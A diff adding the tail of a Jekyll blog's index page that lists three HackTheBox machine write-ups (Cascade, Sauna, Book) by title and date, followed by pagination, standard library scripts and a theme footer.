+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-12-Pentest-Cascade/">Write-up Cascade Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-12-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Jul 25, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-12-Pentest-Cascade/">
+	<img class="w-100" src="/assets/images/cascade/HTB-Badge-Cascade.png" alt="Write-up Cascade Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-11-Pentest-Sauna/">Write-up Sauna Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-11-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Jul 18, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-11-Pentest-Sauna/">
+	<img class="w-100" src="/assets/images/sauna/HTB-Badge-Sauna.png" alt="Write-up Sauna Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+            <div class="mb-5 d-flex justify-content-between main-loop-card">
+<div class="pr-3">
+	<h2 class="mb-1 h4 font-weight-bold">
+	<a class="text-dark" href="/posts/HTB-10-Pentest-Book/">Write-up Book Machine</a>
+	</h2>
+	<p class="excerpt">
+	   Ref°: HTB-10-Machine
+	</p>
+	<small class="d-block text-muted">
+		In <span class="catlist">
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#hackthebox">HackTheBox</a><span class="sep">, </span>
+		
+		<a class="text-capitalize text-muted smoothscroll" href="/categories.html#machine">Machine</a><span class="sep">, </span>
+		
+		</span>
+	</small>
+	<small class="text-muted">
+		Jul 10, 2020
+	</small>
+</div>
+
+	<div class="col-md-3 pr-0 text-right">
+	<a href="/posts/HTB-10-Pentest-Book/">
+	<img class="w-100" src="/assets/images/book/HTB-Badge-Book.png" alt="Write-up Book Machine">
+	</a>
+	</div>
+
+</div>
+        
+        
+        
+        <div class="mt-5">
+         <!-- Pagination links -->
+            
+            <ul class="pagination"> 
+              
+                <li class="page-item disabled"><span class="prev page-link">&laquo;</span></li>
+              
+
+              
+                
+                <li class="page-item disabled"><span class="webjeda page-link">1</span></li>
+                
+              
+                
+                <li class="page-item"><a class="page-link" href="/page2">2</a></li>
+                
+              
+
+              
+                <li class="page-item"><a class="page-link" href="/page2">Next &raquo;</a></li>
+              
+            </ul>
+                  
+        </div>
+        
+    </div>
+    
+    <div class="col-md-4">
+        <div class="sticky-top sticky-top-offset">
+    <h4 class="font-weight-bold spanborder"><span>Featured</span></h4>  
+    <ol class="list-featured">				
+           
+    </ol>
+</div>     
+    </div>
+    
+</div>
+
+
+
+</div>
+
+    </main>
+
+
+    <!-- Scripts: popper, bootstrap, theme, lunr -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
+
+    <script src="/assets/js/theme.js"></script>
+
+
+    <!-- Footer -->
+    <footer class="bg-white border-top p-3 text-muted small">
+        <div class="container">
+        <div class="row align-items-center justify-content-between">
+            <div>
+                <span class="navbar-brand mr-2 mb-0"><strong>Mundana</strong></span>
+                <span>Copyright © <script>document.write(new Date().getFullYear())</script>.</span>
+
+                <!--  Github Repo Star Btn-->
+                <a class="text-dark ml-1" target="_blank" href="https://github.com/wowthemesnet/mundana-theme-jekyll"><i class="fab fa-github"></i> Fork on Github</a>
+
+            </div>
+            <div>
+                Made with <a target="_blank" class="text-dark font-weight-bold" href="https://www.wowthemes.net/mundana-jekyll-theme/"> Mundana Jekyll Theme </a> by <a class="text-dark" target="_blank" href="https://www.wowthemes.net">WowThemes</a>.
+            </div>
+        </div>
+        </div>
+    </footer>
+
+    <!-- All this area goes before </body> closing tag --> 
+
+
+</body>
+
+</html>
